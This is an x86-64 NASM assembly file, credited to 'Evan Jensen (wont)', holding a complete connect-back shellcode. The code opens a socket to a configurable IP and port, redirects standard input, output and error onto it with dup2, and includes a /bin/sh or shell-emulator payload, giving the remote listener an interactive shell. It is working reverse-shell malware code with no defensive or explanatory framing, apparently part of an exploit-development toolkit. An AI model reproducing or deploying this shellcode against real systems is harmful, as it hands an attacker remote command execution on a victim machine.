	;; Evan Jensen (wont) 012014
	;; 64bit Connect back shellcode
	;; Handy One liner for IP
	;; ''.join(['%02x'%int(x)for x in'1.1.1.1'.split('.')][::-1])
	;; port is littleEndian
%include "short64.s"
%include "syscall.s"
%include "util.s"

	
%define IP  		ip(127,0,0,1)
%define PORT		htons(7788)		;port 7788 Little Endian
%define AF_INET 	2
%define SOCK_STREAM	1
%define ANY_PROTO	0
	
;;; 	socket -> connect -> dup -> shell
	
BITS 64
	global main
	

	
main:
	
open_my_socket:
	push byte AF_INET
	pop  rdi
	push byte SOCK_STREAM
	pop rsi
	push byte ANY_PROTO
	pop rdx
	SYSTEM_CALL(socket)

	xchg rax,rdi
make_sockaddr:
	push byte 0		;lame part of sockaddr
	mov rax, (IP <<32 | PORT <<16 | AF_INET) 
	push rax		;important part of sockaddr
	
	mov rsi,rsp		;struct sockaddr*
	push 0x10
	pop rdx			;addrlen
	;RDI=sockfd
	SYSTEM_CALL(connect)
	;; assume success (RAX=0)
	
	
	push byte 2		;loop count and FD#
	pop rsi
copy_stdin_out_err:
	SYSTEM_CALL(dup2)	
	dec rsi
	jns copy_stdin_out_err
	
	;; Any local shellcode here
	
%define EMULATOR
	%ifdef 	EMULATOR
	;;  shell emulating shellcode
	incbin "../64shellEmulator/shellcode"
%else
	;;  ordinary shellcode (/bin/sh)
	incbin "../64BitLocalBinSh/shellcode"
%endif
